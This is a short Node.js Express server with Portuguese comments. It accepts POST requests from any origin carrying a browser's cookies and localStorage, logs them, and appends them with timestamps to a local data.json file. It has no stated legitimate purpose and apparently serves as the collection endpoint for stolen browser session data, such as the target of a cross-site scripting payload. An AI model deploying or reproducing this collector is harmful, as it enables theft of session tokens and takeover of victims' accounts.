const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const port = 3000;

// Habilitar CORS para permitir requisições de qualquer origem
app.use(cors()); // Aqui você permite o acesso de qualquer origem

// Middleware para parsear o corpo da requisição como JSON
app.use(bodyParser.json());

// Rota para receber os cookies e localStorage do cliente
app.post('/', (req, res) => {
  const { cookies, localStorage } = req.body;
  console.log(cookies);
  console.log('\n');
  console.log(localStorage);

  // Gerando o caminho do arquivo onde os dados serão salvos
  const filePath = path.join(__dirname, 'data.json');

  // Objeto com os dados para salvar
  const data = {
    cookies: cookies,
    localStorage: localStorage,
    timestamp: new Date().toISOString(),
  };

  // Lê o arquivo data.json
  fs.readFile(filePath, 'utf8', (err, fileData) => {
    let existingData = [];
    if (!err && fileData) {
      try {
        existingData = JSON.parse(fileData); // Tenta parsear o conteúdo existente
      } catch (err) {
        console.error('Erro ao parsear o arquivo JSON:', err);
      }
    }

    // Adiciona os novos dados ao array existente
    existingData.push(data);

    // Reescreve o arquivo com os dados atualizados
    fs.writeFile(filePath, JSON.stringify(existingData, null, 2), (err) => {
      if (err) {
        return res.status(500).json({ error: 'Erro ao salvar os dados' });
      }

      res.status(200).json({ message: 'Dados salvos com sucesso!' });
    });
  });
});

// Iniciando o servidor
app.listen(port, () => {
  console.log(`Servidor Express rodando na porta ${port}`);
});
